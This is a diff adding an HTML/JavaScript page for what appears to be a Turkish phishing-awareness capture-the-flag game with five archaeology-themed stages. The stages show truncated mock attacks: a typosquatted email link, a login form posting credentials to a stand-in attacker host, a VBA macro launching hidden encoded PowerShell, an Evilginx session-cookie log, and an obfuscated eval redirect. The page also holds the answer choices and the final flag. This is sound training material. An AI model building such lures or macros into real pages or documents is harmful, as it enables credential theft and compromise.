@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MU LAB — Kayıp Kıtanın Sırları</title>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght=400;600;900&family=Crimson+Text:ital,wght=0,400;0,600;1,400&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --gold: #c9a84c; --gold-light: #f0d080; --gold-dim: #7a6030;
+    --stone: #1a1510; --stone2: #231e16; --stone3: #2e271c; --stone4: #3d3526;
+    --text: #e8dfc0; --text-dim: #9e9070; --danger: #c0392b; --success: #27ae60; --cyan: #4fc3f7;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: var(--stone); color: var(--text); font-family: 'Crimson Text', serif; min-height: 100vh; overflow-x: hidden; }
+  body::before {
+    content: ''; position: fixed; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none; z-index: 0; opacity: 0.5;
+  }
+  .page { position: relative; z-index: 1; }
+  #screen-login { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 2rem; background: radial-gradient(ellipse at 50% 30%, #2e2210 0%, #0e0c08 70%); }
+  .temple-header { text-align: center; margin-bottom: 3rem; }
+  .glyph-row { font-size: 2.2rem; letter-spacing: 0.5rem; color: var(--gold-dim); margin-bottom: 1.5rem; animation: glyphPulse 4s ease-in-out infinite; }
+  @keyframes glyphPulse { 0%,100% { opacity: 0.4; } 50% { opacity: 1; color: var(--gold); } }
+  .temple-title { font-family: 'Cinzel', serif; font-size: clamp(2.2rem, 6vw, 4rem); font-weight: 900; color: var(--gold); text-shadow: 0 0 40px rgba(201,168,76,0.4); letter-spacing: 0.2em; line-height: 1.1; }
+  .temple-subtitle { font-family: 'Cinzel', serif; font-size: 0.9rem; color: var(--gold-dim); letter-spacing: 0.4em; margin-top: 0.6rem; }
+  .intro-lore { max-width: 560px; text-align: center; font-size: 1.1rem; color: var(--text-dim); line-height: 1.9; margin-bottom: 2.5rem; font-style: italic; }
+  .intro-lore strong { color: var(--gold); font-style: normal; font-weight: 600; }
+  .login-box { background: linear-gradient(135deg, #1e1a12, #2a2418); border: 1px solid var(--gold-dim); border-radius: 4px; padding: 2.5rem; width: 100%; max-width: 420px; box-shadow: 0 0 60px rgba(0,0,0,0.8), inset 0 0 30px rgba(0,0,0,0.3); }
+  .login-box h2 { font-family: 'Cinzel', serif; font-size: 0.8rem; letter-spacing: 0.3em; color: var(--gold-dim); text-align: center; margin-bottom: 1.8rem; }
+  .field-group { margin-bottom: 1.2rem; }
+  .field-group label { display: block; font-size: 0.75rem; letter-spacing: 0.15em; color: var(--gold-dim); font-family: 'Share Tech Mono', monospace; margin-bottom: 0.4rem; }
+  .field-group input { width: 100%; background: #0e0c08; border: 1px solid var(--stone4); border-radius: 2px; padding: 0.7rem 1rem; color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.9rem; }
+  .btn-enter { width: 100%; margin-top: 1.5rem; background: linear-gradient(135deg, #4a3c1a, #6b5525); border: 1px solid var(--gold-dim); border-radius: 2px; padding: 0.9rem; color: var(--gold); font-family: 'Cinzel', serif; font-size: 0.85rem; letter-spacing: 0.25em; cursor: pointer; transition: all 0.3s; }
+  .btn-enter:hover { background: linear-gradient(135deg, #6b5525, #8a6e30); box-shadow: 0 0 20px rgba(201,168,76,0.2); }
+  #screen-main { display: none; }
+  .top-bar { background: linear-gradient(90deg, #0e0c08, #1a1510, #0e0c08); border-bottom: 1px solid var(--gold-dim); padding: 0.8rem 2rem; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+  .top-bar-title { font-family: 'Cinzel', serif; font-size: 0.85rem; color: var(--gold); letter-spacing: 0.2em; }
+  .user-badge { font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; color: var(--text-dim); }
+  .user-badge span { color: var(--gold); }
+  .map-section { padding: 2rem; border-bottom: 1px solid var(--stone4); }
+  .map-title { font-family: 'Cinzel', serif; font-size: 0.7rem; letter-spacing: 0.3em; color: var(--gold-dim); margin-bottom: 1rem; text-align: center; }
+  .mu-map { position: relative; max-width: 700px; margin: 0 auto; }
+  .mu-map svg { width: 100%; height: auto; }
+  .stages-section { padding: 2rem; max-width: 900px; margin: 0 auto; }
+  .stages-title { font-family: 'Cinzel', serif; font-size: 0.7rem; letter-spacing: 0.3em; color: var(--gold-dim); text-align: center; margin-bottom: 2rem; }
+  .stage-card { background: linear-gradient(135deg, #1a1510, #231e16); border: 1px solid var(--stone4); border-radius: 4px; margin-bottom: 1.5rem; overflow: hidden; transition: border-color 0.3s; position: relative; }
+  .stage-card.unlocked { border-color: var(--gold-dim); }
+  .stage-card.completed { border-color: var(--success); }
+  .stage-card.locked { opacity: 0.3; pointer-events: none; }
+  .stage-header { display: flex; align-items: center; gap: 1rem; padding: 1.2rem 1.5rem; }
+  .stage-num { font-family: 'Cinzel', serif; font-size: 1.8rem; font-weight: 900; color: var(--gold-dim); min-width: 2.5rem; text-align: center; line-height: 1; }
+  .stage-card.completed .stage-num { color: var(--success); }
+  .stage-meta { flex: 1; }
+  .stage-name { font-family: 'Cinzel', serif; font-size: 1rem; font-weight: 600; color: var(--gold); margin-bottom: 0.2rem; }
+  .stage-diff { font-family: 'Share Tech Mono', monospace; font-size: 0.7rem; color: var(--text-dim); letter-spacing: 0.1em; }
+  .stage-status { font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; padding: 0.3rem 0.7rem; border-radius: 2px; border: 1px solid; }
+  .status-locked { color: var(--text-dim); border-color: var(--stone4); }
+  .status-active { color: var(--gold); border-color: var(--gold-dim); background: rgba(201,168,76,0.08); }
+  .status-done { color: var(--success); border-color: var(--success); background: rgba(39,174,96,0.08); }
+  .stage-body { display: none; padding: 0 1.5rem 1.5rem; border-top: 1px solid var(--stone4); }
+  .stage-card.unlocked .stage-body, .stage-card.completed .stage-body { display: block; }
+  .stage-lore { font-style: italic; color: var(--text-dim); font-size: 0.95rem; line-height: 1.8; margin-bottom: 1.2rem; padding: 1rem; border-left: 2px solid var(--gold-dim); margin-top: 1rem; }
+  .challenge-box { background: #0e0c08; border: 1px solid var(--stone4); border-radius: 3px; padding: 1.2rem; font-family: 'Share Tech Mono', monospace; font-size: 0.82rem; line-height: 1.7; color: var(--text-dim); margin-bottom: 1.2rem; }
+  .challenge-box .label { color: var(--cyan); display: block; margin-bottom: 0.5rem; font-size: 0.7; letter-spacing: 0.2em; }
+  .hint-toggle { background: none; border: 1px solid var(--stone4); border-radius: 2px; padding: 0.4rem 0.8rem; color: var(--text-dim); font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; cursor: pointer; margin-bottom: 1rem; letter-spacing: 0.1em; }
+  .hint-box { display: none; background: rgba(201,168,76,0.05); border: 1px solid rgba(201,168,76,0.2); border-radius: 3px; padding: 0.8rem 1rem; font-size: 0.85rem; color: var(--text-dim); margin-bottom: 1rem; line-height: 1.7; }
+  .flag-form { display: flex; gap: 0.8rem; align-items: center; flex-wrap: wrap; margin-top: 1rem; }
+  .flag-form input { flex: 1; min-width: 200px; background: #0e0c08; border: 1px solid var(--stone4); border-radius: 2px; padding: 0.6rem 1rem; color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.85rem; }
+  .btn-submit { background: linear-gradient(135deg, #2a2210, #3d3218); border: 1px solid var(--gold-dim); border-radius: 2px; padding: 0.6rem 1.2rem; color: var(--gold); font-family: 'Cinzel', serif; font-size: 0.75rem; letter-spacing: 0.2em; cursor: pointer; }
+  .flag-msg { width: 100%; font-family: 'Share Tech Mono', monospace; font-size: 0.8rem; margin-top: 0.4rem; padding: 0.4rem 0; display: none; }
+  .flag-msg.ok { color: var(--success); display: block; }
+  .flag-msg.err { color: var(--danger); display: block; }
+  .artifact-popup { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 999; align-items: center; justify-content: center; padding: 1rem; }
+  .artifact-popup.show { display: flex; }
+  .artifact-inner { background: linear-gradient(135deg, #1a1510, #231e16); border: 1px solid var(--gold-dim); border-radius: 4px; padding: 2rem; max-width: 560px; width: 100%; position: relative; box-shadow: 0 0 80px rgba(0,0,0,0.9); }
+  .artifact-close { position: absolute; top: 1rem; right: 1rem; background: none; border: none; color: var(--text-dim); font-size: 1.2rem; cursor: pointer; }
+  .artifact-title { font-family: 'Cinzel', serif; color: var(--gold); margin-bottom: 1.2rem; font-size: 1.1rem; }
+  .artifact-content { font-size: 0.85rem; line-height: 1.8; color: var(--text-dim); }
+  .email-mock { background: #f5f0e8; color: #333; border-radius: 3px; padding: 1.2rem; font-family: 'Share Tech Mono', monospace; font-size: 0.78rem; line-height: 1.7; }
+  .email-mock .em-header { border-bottom: 1px solid #ccc; padding-bottom: 0.6rem; margin-bottom: 0.8rem; }
+  .email-mock .em-field { color: #666; }
+  .email-mock .em-field span { color: #333; }
+  .email-mock .em-link { color: #1a0dab; text-decoration: underline; }
+  .login-mock { background: #fff; border: 1px solid #ddd; border-radius: 3px; padding: 1.5rem; color: #333; font-family: sans-serif; font-size: 0.82rem; }
+  .login-mock h3 { color: #003087; font-size: 0.9rem; margin-bottom: 0.8rem; }
+  .login-mock input { display: block; width: 100%; border: 1px solid #ccc; border-radius: 3px; padding: 0.5rem; margin-bottom: 0.5rem; }
+  .vba-mock { background: #1e1e2e; border-radius: 3px; padding: 1rem; font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; color: #cdd6f4; }
+  .vba-comment { color: #6c7086; }
+  .vba-keyword { color: #cba6f7; }
+  .vba-string { color: #a6e3a1; }
+  .log-mock { background: #0a0a0f; border-radius: 3px; padding: 1rem; font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; color: #4fc3f7; overflow-x: auto; white-space: pre; }
+  .obfus-code { background: #0e0c08; border-radius: 3px; padding: 0.8rem; font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; color: #f9e2af; word-break: break-all; white-space: pre-wrap; }
+  .progress-bar-wrap { margin: 1.5rem auto; padding: 0 2rem; max-width: 900px; }
+  .progress-label { font-family: 'Share Tech Mono', monospace; font-size: 0.7; color: var(--text-dim); letter-spacing: 0.15em; margin-bottom: 0.4rem; display: flex; justify-content: space-between; }
+  .progress-bar { height: 3px; background: var(--stone4); border-radius: 2px; overflow: hidden; }
+  .progress-fill { height: 100%; background: linear-gradient(90deg, var(--gold-dim), var(--gold)); transition: width 0.8s ease; }
+  #screen-congrats { display: none; min-height: 100vh; align-items: center; justify-content: center; flex-direction: column; text-align: center; padding: 2rem; background: radial-gradient(ellipse at 50% 30%, #1a1a00 0%, #0a0a00 70%); }
+  .congrats-glyph { font-size: 4rem; color: var(--gold); margin-bottom: 2rem; }
+  .congrats-title { font-family: 'Cinzel', serif; font-size: clamp(1.8rem, 5vw, 3rem); color: var(--gold); margin-bottom: 1rem; }
+  .congrats-text { max-width: 500px; font-size: 1.1rem; color: var(--text-dim); margin-bottom: 2rem; font-style: italic; }
+  .final-flag { font-family: 'Share Tech Mono', monospace; font-size: 1.1rem; color: var(--gold); background: rgba(201,168,76,0.1); border: 1px solid var(--gold-dim); padding: 0.8rem 1.6rem; }
+  .flag-choices { margin-top: 1rem; display: flex; flex-direction: column; gap: 0.4rem; }
+  .flag-choice { font-family: 'Share Tech Mono', monospace; font-size: 0.78rem; padding: 0.6rem 1rem; background: #0e0c08; border: 1px solid var(--stone4); border-radius: 2px; color: var(--text-dim); cursor: pointer; transition: all 0.15s; }
+  .flag-choice:hover { border-color: var(--gold-dim); color: var(--gold); background: #1a1510; }
+  .flag-choice.selected { border-color: var(--gold); color: var(--gold); background: #1e1a10; }
+</style>
+</head>
+<body>
+<div class="page">
+ 
+<div id="screen-login">
+  <div class="temple-header">
+    <div class="glyph-row">𓂀 𓆏 𓇯 𓈖 𓉐 𓊃 𓋴 𓌃</div>
+    <h1 class="temple-title">MU<br>KITASI</h1>
+    <p class="temple-subtitle">☽ KAYIP MEDENİYETİN DİJİTAL ARŞİVİ ☾</p>
+  </div>
+  <p class="intro-lore">Pasifik'in derinliklerinde yüzyıllarca uyuyan Mu Kıtası, modern arkeolojinin sınırlarını zorluyor. Baş Arkeolog Dr. Mehmet Ş.'nin dijital çalışma alanına erişim sağlayarak Paper'ı çözebilir misin?</p>
+  <div class="login-box">
+    <h2>⬡ ARKEOLOG ERİŞİM PANELİ ⬡</h2>
+    <div class="field-group">
+      <label>KULLANICI ADI</label>
+      <input type="text" id="inp-user" placeholder="Kullanıcı adı girin..." autocomplete="off" >
+    </div>
+    <button class="btn-enter" onclick="doLogin()">KAPI AÇILSIN ⟶</button>
+  </div>
+</div>
+ 
+<div id="screen-main">
+  <div class="top-bar">
+    <span class="top-bar-title">𓂀 MU ARŞİV PANELİ</span>
+    <span class="user-badge">Hoş geldin, <span id="display-user">araştırmacı</span> · <span id="level-display">AŞAMA 1/5</span></span>
+  </div>
+ 
+  <div class="map-section">
+    <p class="map-title">⬡ MU KITASI — KEŞİF HARİTASI ⬡</p>
+    <div class="mu-map">
+      <svg viewBox="0 0 700 220" xmlns="http://www.w3.org/2000/svg">
+        <polygon points="80,180 60,140 90,100 140,80 200,70 280,60 360,55 440,60 500,75 540,100 560,140 540,170 480,190 400,200 300,205 200,200 130,190" fill="#1a1510" stroke="#3d3526" stroke-width="1.5"/>
+        <g id="map-zone-1"><circle cx="150" cy="130" r="28" fill="#1a1510" stroke="#3d3526" stroke-width="1.5" id="zone1-bg"/><text x="150" y="126" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">KAYIP</text><text x="150" y="137" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">TABLETLER</text></g>
+        <g id="map-zone-2"><circle cx="260" cy="115" r="28" fill="#1a1510" stroke="#3d3526" stroke-width="1.5" id="zone2-bg"/><text x="260" y="111" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">MU'NUN</text><text x="260" y="122" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">KONSEYİ</text></g>
+        <g id="map-zone-3"><circle cx="370" cy="105" r="28" fill="#1a1510" stroke="#3d3526" stroke-width="1.5" id="zone3-bg"/><text x="370" y="101" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">GEZGİNİN</text><text x="370" y="112" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">GÜNLÜĞÜ</text></g>
+        <g id="map-zone-4"><circle cx="470" cy="115" r="28" fill="#1a1510" stroke="#3d3526" stroke-width="1.5" id="zone4-bg"/><text x="470" y="111" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">MİSTİK</text><text x="470" y="122" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">GÜVENL.</text></g>
+        <g id="map-zone-5"><circle cx="570" cy="140" r="30" fill="#1a1510" stroke="#3d3526" stroke-width="1.5" id="zone5-bg"/><text x="570" y="136" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">KAYIP</text><text x="570" y="147" text-anchor="middle" font-family="Cinzel,serif" font-size="8" fill="#7a6030">KALBİ</text></g>
+        <polyline points="150,130 260,115 370,105 470,115 570,140" fill="none" stroke="#3d3526" stroke-width="1" stroke-dasharray="5,5"/>
+      </svg>
+    </div>
+  </div>
+ 
+  <div class="progress-bar-wrap">
+    <div class="progress-label"><span>ARAŞTIRMA İLERLEMESİ</span><span id="pct-label">0%</span></div>
+    <div class="progress-bar"><div class="progress-fill" id="progress-fill" style="width:0%"></div></div>
+  </div>
+ 
+  <div class="stages-section" id="stages-container"></div>
+</div>
+ 
+<div id="screen-congrats">
+  <div class="congrats-glyph">𓂀 𓇯 𓊃 𓌃 𓂀</div>
+  <h1 class="congrats-title">𓂀 MU'NUN GİZLİ HAZİNESİ SENİNDİR 𓂀</h1>
+  <p class="congrats-text">Tebrikler! Beş tehdit vektörünü başarıyla analiz ettin ve sistemi pasifize ettin.</p>
+  <div style="font-size:5rem;margin:1.5rem 0;">🏆</div>
+  <div class="final-flag">🏆 &nbsp; MU{tum_seferler_tamamlandi_arkeolog_zafer} &nbsp; 🏺</div>
+  <button onclick="location.reload()" style="margin-top:2rem;background:none;border:1px solid var(--gold-dim);border-radius:2px;padding:0.7rem 1.5rem;color:var(--gold-dim);font-family:'Cinzel',serif;font-size:0.75rem;cursor:pointer;">YENİDEN BAŞLA ↺</button>
+</div>
+ 
+<div class="artifact-popup" id="artifact-popup">
+  <div class="artifact-inner">
+    <button class="artifact-close" onclick="closeArtifact()">✕</button>
+    <h2 class="artifact-title" id="artifact-title">Bölge Kilidi Açıldı</h2>
+    <div class="artifact-content" id="artifact-content"></div>
+  </div>
+</div>
+ 
+</div>
+ 
+<script>
+// SİBER GÜVENLİK KAPSÜLÜ (IIFE) BAŞLANGICI
+(function() {
+  const API_BASE_URL = window.location.hostname === "localhost" 
+  ? "http://localhost:5000/api" 
+  : `${window.location.origin}/api`;
+  let currentLevel = 1;
+
+  const STAGE_STATIC_DATA = {
+    1: { name: "Kayıp Tabletler", lore: "Dr. Mehmet Ş.'nin enstitü e-posta kutusunda şüpheli bir link tespit edildi...", hint: "E-postadaki gönderici adresinin uzantısını dikkatlice inceleyin." },
+    2: { name: "Mu'nun Konseyi", lore: "Akademik personeli hedef alan sahte bir giriş ekranı formu var.", hint: "Form etiketinin 'action' parametresi hangi adrese işaret ediyor?" },
+    3: { name: "Gezginin Günlüğü", lore: "Arşiv dosyaları arasında gizlenmiş tehlikeli bir makro kodu bulundu.", hint: "VBA kodunun içerisindeki Shell() fonksiyonu neyi tetikliyor?" },
+    4: { name: "Mistik Güvenlik Duvarı", lore: "Araya giren bir proxy sunucusu oturum çerezlerini çalmaya çalışıyor.", hint: "Set-Cookie başlığındaki sid değerini ve proxy imzasını kontrol edin." },
+    5: { name: "Kayıp Kıtanın Kalbi", lore: "Deobfuscate edilmesi gereken karmaşık bir QR kodu (Quishing) vakası.", hint: "eval() fonksiyonunun içindeki çözümlenmiş JavaScript yönlendirmesine bakın." }
+  };
+
+  function doLogin() {
+    const u = document.getElementById('inp-user').value.trim() || 'Araştırmacı';
+    document.getElementById('display-user').textContent = u;
+    document.getElementById('screen-login').style.display = 'none';
+    document.getElementById('screen-main').style.display = 'block';
+    
+    renderStages();
+    updateProgress();
+    updateMapZone(1, 'unlocked');
+  }
+
+  function renderStages() {
+    const container = document.getElementById('stages-container');
+    container.innerHTML = ''; 
+
+    const dynamicTemplates = {
+      1: { diff: "ÇOK KOLAY · Temel Link Analizi", mock: `<span class="label">// SİMÜLE E-POSTA</span><div class="email-mock"><div class="em-header"><div class="em-field">Kimden: <span>enstitü@mu-arkeolojı-enstıtusu.com</span></div></div>Görsellere aşağıdaki bağlantıdan ulaşabilirsiniz:<br><br><span class="em-link">http://mu-arkeolojı-enstıtusu.com/tablet-gorseller</span></div>`, choices: ["MU{smishing_link_tespit}", "MU{watering_hole_bulundu}", "MU{vishing_sosyal_muhendis}", "MU{typosquatting_engellendi}", "MU{quishing_bitirildi}"] },
+      2: { diff: "KOLAY · Kimlik Bilgisi Avcılığı", mock: `<span class="label">// HTML KAYNAK KOD ANALİZİ</span><div class="login-mock"><h3>MU UNIVERSITY - LOGIN</h3><form action="http://saldirgan-sunucu.local/capture.php" method="POST"><input type="text" placeholder="Username" disabled><input type="password" placeholder="Password" disabled></form></div>`, choices: ["MU{mfa_bypass_edildi}", "MU{credential_harvesting_tespit}", "MU{sql_injection_saptandi}", "MU{xss_saldirisi_onlendi}", "MU{rce_payload_yakalandi}"] },
+      3: { diff: "ORTA · Zararlı Makro Analizi", mock: `<span class="label">// SİMÜLE VBA MACRO KODU</span><div class="vba-mock"><span class="vba-keyword">Sub</span> Document_Open()<br>&nbsp;&nbsp;payload = <span class="vba-string">"powershell.exe -nop -w hidden -enc SUV7..."</span><br>&nbsp;&nbsp;Shell(payload, vbHide)<br><span class="vba-keyword">End Sub</span></div>`, choices: ["MU{zararli_makro_vba_analiz}", "MU{ransomware_sifre_cozuldu}", "MU{buffer_overflow_engellendi}", "MU{brute_force_bloklandi}", "MU{clickjacking_fark_edildi}"] },
+      4: { diff: "ZOR · Ortadaki Saldırgan & Session Hijack", mock: `<span class="label">// PROXY LOGU</span><div class="log-mock">HTTP/1.1 200 OK\nSet-Cookie: <span style="color:var(--danger)">sid=AMF93KLD92K3D92; Domain=mu-enstitusu.com</span>\nEvilginx-Proxy-Handshake: True</div>`, choices: ["MU{ddos_saldirisi_bastirildi}", "MU{dns_poisoning_cozuldu}", "MU{aitm_session_hijack_tespit}", "MU{arp_spoofing_yakalandi}", "MU{local_file_inclusion_cozum}"] },
+      5: { diff: "ÇOK ZOR · QR Phishing (Quishing)", mock: `<span class="label">// DEOBFUSCATION / QR DATA</span><div class="obfus-code">eval(function(p,a,c,k,e,r){...}('window.location="http://quishing-mu.local";',1,1,''.split('|'),0,{}))</div>`, choices: ["MU{zero_day_bypassed}", "MU{sql_blind_injection}", "MU{directory_traversal}", "MU{quishing_bitirildi}", "MU{command_injection_ok}"] }
+    };
+
+    for (let i = 1; i <= 5; i++) {
+      const stageInfo = STAGE_STATIC_DATA[i];
+      const tpl = dynamicTemplates[i];
+      const isUnlocked = i === 1 ? "unlocked" : "locked";
+      const statusText = i === 1 ? "AKTİF" : "KİLİTLİ";
+      const statusClass = i === 1 ? "status-active" : "status-locked";
+
+      container.innerHTML += `
+        <div class="stage-card ${isUnlocked}" id="stage-${i}">
+          <div class="stage-header">
+            <div class="stage-num">0${i}</div>
+            <div class="stage-meta">
+              <div class="stage-name">"${stageInfo.name}"</div>
+              <div class="stage-diff">${tpl.diff}</div>
+            </div>
+            <div class="stage-status ${statusClass}" id="status-${i}">${statusText}</div>
+          </div>
+          <div class="stage-body">
+            <div class="stage-lore">${stageInfo.lore}</div>
+            <div class="challenge-box">${tpl.mock}</div>
+            <button class="hint-toggle" onclick="toggleHint('h${i}')">💡 İPUCU GÖSTER</button>
+            <div class="hint-box" id="h${i}">${stageInfo.hint}</div>
+            <div class="flag-choices">
+              ${tpl.choices.map(choice => `<div class="flag-choice" onclick="pickFlag(${i}, this)">${choice}</div>`).join('')}
+            </div>
+            <div class="flag-form">
+              <input type="text" id="f${i}" placeholder="Yukarıdan bir şık seçin veya yazın" autocomplete="off">
+              <button class="btn-submit" onclick="checkFlag(${i})">DOĞRULA ⟶</button>
+            </div>
+            <div class="flag-msg" id="msg-${i}"></div>
+          </div>
+        </div>
+      `;
+    }
+  }
+   
+  function pickFlag(level, el) {
+    const all = document.querySelectorAll('#stage-' + level + ' .flag-choice');
+    all.forEach(o => o.classList.remove('selected'));
+    el.classList.add('selected');
+    document.getElementById('f' + level).value = el.textContent;
+  }
+
+  function toggleHint(id) {
+    const el = document.getElementById(id);
+    if (el) el.style.display = el.style.display === 'block' ? 'none' : 'block';
+  }
+
+  function checkFlag(level) {
+    const inp = document.getElementById('f' + level);
+    const msg = document.getElementById('msg-' + level);
+    const raw = inp.value.trim();
+    if (!raw) return;
+
+    msg.style.display = 'block';
+    msg.textContent = '⌛ Veri doğrulanıyor...';
+    msg.className = 'flag-msg';
+
+    fetch(`${API_BASE_URL}/flags/check`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ stage_number: parseInt(level), flag_text: raw })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.correct) {
+            msg.textContent = '✓ DOĞRU!';
+            msg.className = 'flag-msg ok';
+            inp.disabled = true;
+            setTimeout(() => { completeStage(level); }, 800);
+        } else {
+            msg.textContent = '✗ Yanlış Tehdit Vektörü! Tekrar dene.';
+            msg.className = 'flag-msg err';
+        }
+    })
+    .catch(err => {
+        console.error("Sunucu hatası:", err);
+        msg.textContent = '✗ Sunucu bağlantı hatası!';
+        msg.className = 'flag-msg err';
+    });
+  }
+   
+  // TAMAMEN GİZLENEN VE KONSOLDAN ERİŞİLEMEYEN KRİTİK FONKSİYONLAR
+  function completeStage(level) {
+    const card = document.getElementById('stage-' + level);
+    if (card) {
+      card.classList.remove('unlocked');
+      card.classList.add('completed');
+    }
+    const st = document.getElementById('status-' + level);
+    if (st) {
+      st.textContent = 'TAMAMLANDI';
+      st.className = 'stage-status status-done';
+    }
+   
+    updateMapZone(level, 'completed');
+    showArtifact(`🗺️ Aşama ${level} Kilidi Açıldı!`, `Tehdit vektörü başarıyla pasifize edildi.`);
+   
+    if (level < 5) {
+      setTimeout(() => {
+        closeArtifact();
+        unlockStage(level + 1);
+      }, 1500);
+    } else {
+      setTimeout(() => {
+        closeArtifact();
+        document.getElementById('screen-main').style.display = 'none';
+        document.getElementById('screen-congrats').style.display = 'flex';
+      }, 1500);
+    }
+  }
+   
+  function unlockStage(level) {
+    currentLevel = level;
+    const card = document.getElementById('stage-' + level);
+    if (card) {
+      card.classList.remove('locked');
+      card.classList.add('unlocked');
+    }
+    const st = document.getElementById('status-' + level);
+    if (st) {
+      st.textContent = 'AKTİF';
+      st.className = 'stage-status status-active';
+    }
+    
+    updateMapZone(level, 'unlocked');
+    document.getElementById('level-display').textContent = 'AŞAMA ' + level + '/5';
+    updateProgress();
+  }
+   
+  function updateMapZone(level, state) {
+    const bg = document.getElementById('zone' + level + '-bg');
+    if (!bg) return;
+    if (state === 'completed') {
+      bg.setAttribute('stroke', '#27ae60');
+      bg.setAttribute('fill', 'rgba(39,174,96,0.15)');
+    } else if (state === 'unlocked') {
+      bg.setAttribute('stroke', '#c9a84c');
+      bg.setAttribute('fill', 'rgba(201,168,76,0.15)');
+    }
+  }
+   
+  function updateProgress() {
+    const done = document.querySelectorAll('.stage-card.completed').length;
+    const pct = Math.round((done / 5) * 100);
+    document.getElementById('progress-fill').style.width = pct + '%';
+    document.getElementById('pct-label').textContent = pct + '%';
+  }
+   
+  function showArtifact(title, content) {
+    document.getElementById('artifact-title').textContent = title;
+    document.getElementById('artifact-content').innerHTML = content;
+    document.getElementById('artifact-popup').classList.add('show');
+  }
+   
+  function closeArtifact() {
+    document.getElementById('artifact-popup').classList.remove('show');
+  }
+
+  // HTML ÜZERİNDEKİ ONCLICK BUTONLARININ KAPSÜL İÇİNE ERİŞEBİLMESİ İÇİN GEREKLİ KÖPRÜLER
+  window.doLogin = doLogin;
+  window.checkFlag = checkFlag;
+  window.pickFlag = pickFlag;
+  window.toggleHint = toggleHint;
+  window.closeArtifact = closeArtifact;
+
+})(); // SİBER GÜVENLİK KAPSÜLÜ (IIFE) BITIŞI
+</script>
+</body>
+</html>
